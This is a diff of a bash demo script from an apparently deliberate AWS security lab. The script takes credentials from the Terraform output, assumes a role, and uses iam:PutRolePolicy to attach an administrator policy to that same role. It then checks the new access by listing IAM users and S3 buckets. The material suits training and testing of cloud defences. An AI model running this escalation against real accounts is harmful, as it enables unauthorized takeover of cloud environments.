@@ -1,7 +1,7 @@
 #!/bin/bash
 
-# Demo script for prod_self_privesc_putRolePolicy module
-# This script demonstrates how to use the self-privilege escalation role
+# Demo script for iam:PutRolePolicy privilege escalation
+# This is a ROLE-BASED self-escalation scenario
 
 set -e
 
@@ -14,40 +14,82 @@ GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
 NC='\033[0m' # No Color
 
-echo -e "${YELLOW}=== Pathfinder-labs Self-Privilege Escalation Demo ===${NC}"
-echo "This demo shows how a role can escalate its own privileges"
-echo ""
+# Configuration
+STARTING_USER="pl-prod-prp-to-admin-starting-user"
+STARTING_ROLE="pl-prod-prp-to-admin-starting-role"
 
-# Check if AWS CLI is installed
-if ! command -v aws &> /dev/null; then
-    echo -e "${RED}Error: AWS CLI is not installed${NC}"
+echo -e "${GREEN}========================================${NC}"
+echo -e "${GREEN}IAM PutRolePolicy Privilege Escalation Demo${NC}"
+echo -e "${GREEN}========================================${NC}"
+echo -e "${YELLOW}Role-Based Self-Escalation${NC}\n"
+
+# Step 1: Get credentials from Terraform output
+echo -e "${YELLOW}Step 1: Getting starting user credentials from Terraform${NC}"
+cd ../../../../../..  # Go to project root
+
+# Get the module output
+MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_self_escalation_to_admin_iam_putrolepolicy.value // empty')
+
+if [ -z "$MODULE_OUTPUT" ]; then
+    echo -e "${RED}Error: Could not find terraform output${NC}"
+    echo "Make sure you've deployed this scenario with: terraform apply"
     exit 1
 fi
 
-# Disable paging for AWS CLI
-export AWS_PAGER=""
+# Extract credentials
+export AWS_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
+export AWS_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
+ROLE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.starting_role_arn')
 
-# Role name and ARN (we'll construct the ARN since we can't get it via GetRole)
-ROLE_NAME="pl-prod-one-hop-putrolepolicy-role"
-ACCOUNT_ID=$(aws sts get-caller-identity --profile pl-pathfinder-starting-user-prod --query 'Account' --output text)
-ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${ROLE_NAME}"
+if [ "$AWS_ACCESS_KEY_ID" == "null" ] || [ -z "$AWS_ACCESS_KEY_ID" ]; then
+    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
+    exit 1
+fi
 
-echo -e "${YELLOW}Step 1: Attempting to assume role${NC}"
+echo -e "${GREEN}✓ Retrieved credentials for $STARTING_USER${NC}\n"
+
+cd - > /dev/null  # Return to scenario directory
+
+# Step 2: Verify identity as user
+echo -e "${YELLOW}Step 2: Verifying identity${NC}"
+CURRENT_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
+echo "Current identity: $CURRENT_IDENTITY"
+
+if [[ ! $CURRENT_IDENTITY == *"$STARTING_USER"* ]]; then
+    echo -e "${RED}Error: Not running as expected user${NC}"
+    exit 1
+fi
+echo -e "${GREEN}✓ Verified identity as $STARTING_USER${NC}\n"
+
+# Step 3: Assume the starting role
+echo -e "${YELLOW}Step 3: Assuming starting role${NC}"
 echo "Role ARN: $ROLE_ARN"
 
-echo ""
-echo -e "${YELLOW}Step 2: Assuming the role${NC}"
-# Assume the role
-ASSUME_ROLE_OUTPUT=$(aws sts assume-role --role-arn "$ROLE_ARN" --role-session-name "self-privesc-demo" --profile pl-pathfinder-starting-user-prod)
+ASSUME_ROLE_OUTPUT=$(aws sts assume-role \
+    --role-arn "$ROLE_ARN" \
+    --role-session-name "prp-demo-session")
+
+# Update credentials to use assumed role
 export AWS_ACCESS_KEY_ID=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.AccessKeyId')
 export AWS_SECRET_ACCESS_KEY=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.SecretAccessKey')
 export AWS_SESSION_TOKEN=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.SessionToken')
 
-echo -e "${GREEN}✓ Successfully assumed role${NC}"
+echo -e "${GREEN}✓ Successfully assumed role $STARTING_ROLE${NC}\n"
 
-echo ""
-echo -e "${YELLOW}Step 3: Creating admin policy for self-privilege escalation${NC}"
-# Create a policy that grants administrator access
+# Step 4: Test current permissions (should be limited)
+echo -e "${YELLOW}Step 4: Testing current permissions${NC}"
+echo "Attempting to list IAM users (should fail)..."
+if aws iam list-users --max-items 1 2>&1 | grep -q "AccessDenied\|not authorized"; then
+    echo -e "${GREEN}✓ Confirmed limited permissions${NC}\n"
+else
+    echo -e "${YELLOW}⚠ Warning: Unexpected permissions${NC}\n"
+fi
+
+# Step 5: Perform privilege escalation via PutRolePolicy
+echo -e "${YELLOW}Step 5: Escalating privileges via iam:PutRolePolicy${NC}"
+echo "Creating admin policy for self..."
+
+# Create admin policy document
 cat > /tmp/admin-policy.json << EOF
 {
     "Version": "2012-10-17",
@@ -61,48 +103,44 @@ cat > /tmp/admin-policy.json << EOF
 }
 EOF
 
-echo "Admin policy content:"
-cat /tmp/admin-policy.json
-
-echo ""
-echo -e "${YELLOW}Step 5: Applying admin policy to the role (self-privilege escalation)${NC}"
-# Apply the admin policy to the role
+echo "Applying admin policy to role (self)..."
 aws iam put-role-policy \
-    --role-name "$ROLE_NAME" \
+    --role-name "$STARTING_ROLE" \
     --policy-name "self-admin-policy" \
     --policy-document file:///tmp/admin-policy.json
 
-echo -e "${GREEN}✓ Successfully applied admin policy to role${NC}"
+echo -e "${GREEN}✓ Successfully applied admin policy to self!${NC}\n"
 
-# Sleep for 10 seconds
-echo "Sleeping for 10 seconds..."
-sleep 10
-
+# Wait for policy to propagate
+echo -e "${YELLOW}Waiting 15 seconds for policy changes to propagate...${NC}"
+sleep 15
 echo ""
-echo -e "${YELLOW}Step 6: Verifying privilege escalation${NC}"
-# Verify the policy was applied by testing admin access
-echo "Testing admin access by listing IAM users:"
-aws iam list-users --max-items 5 --query 'Users[].UserName' --output text
 
-echo ""
-echo -e "${GREEN}✓ Privilege escalation successful!${NC}"
-echo "The role now has administrator access through its own policy modification."
+# Step 6: Verify admin access
+echo -e "${YELLOW}Step 6: Verifying administrator access${NC}"
+echo "Testing admin permissions (listing IAM users)..."
+IAM_USERS=$(aws iam list-users --max-items 5 --query 'Users[*].UserName' --output text)
+echo -e "${GREEN}✓ Successfully listed IAM users: $IAM_USERS${NC}"
 
-# Standardized test results output
-echo "TEST_RESULT:prod_one_hop_to_admin_iam_putrolepolicy:SUCCESS"
-echo "TEST_DETAILS:prod_one_hop_to_admin_iam_putrolepolicy:Successfully escalated privileges using PutRolePolicy to attach admin policy"
-echo "TEST_METRICS:prod_one_hop_to_admin_iam_putrolepolicy:policy_attached=true,admin_access_gained=true,cleanup_completed=true"
+echo "Testing S3 access..."
+aws s3 ls | head -5 || echo -e "${YELLOW}(No buckets or still propagating)${NC}"
 
-#Sleep for 10 seconds
-echo "Sleeping for 10 seconds..."
-sleep 10
+echo -e "${GREEN}✓ Confirmed administrator access!${NC}\n"
 
 # Clean up temp file
 rm -f /tmp/admin-policy.json
 
+# Summary
+echo -e "${GREEN}========================================${NC}"
+echo -e "${GREEN}Attack Summary${NC}"
+echo -e "${GREEN}========================================${NC}"
+echo -e "Starting Point: User ${YELLOW}$STARTING_USER${NC}"
+echo -e "Step 1: Assumed role ${YELLOW}$STARTING_ROLE${NC}"
+echo -e "Step 2: Used ${YELLOW}iam:PutRolePolicy${NC} to attach admin policy to self"
+echo -e "Result: ${GREEN}Administrator Access${NC}"
 echo ""
-echo -e "${GREEN}=== Demo Complete ===${NC}"
-echo "This demonstrates how a role with iam:PutRolePolicy on itself can escalate its own privileges."
+echo -e "${YELLOW}Attack Path:${NC}"
+echo -e "  $STARTING_USER → (AssumeRole) → $STARTING_ROLE → (PutRolePolicy on self) → Admin"
 echo ""
-echo -e "${YELLOW}To clean up the changes made by this demo, run:${NC}"
-echo "./cleanup_attack.sh"
+echo -e "${RED}IMPORTANT: Run cleanup_attack.sh to remove the self-admin-policy${NC}"
+echo ""
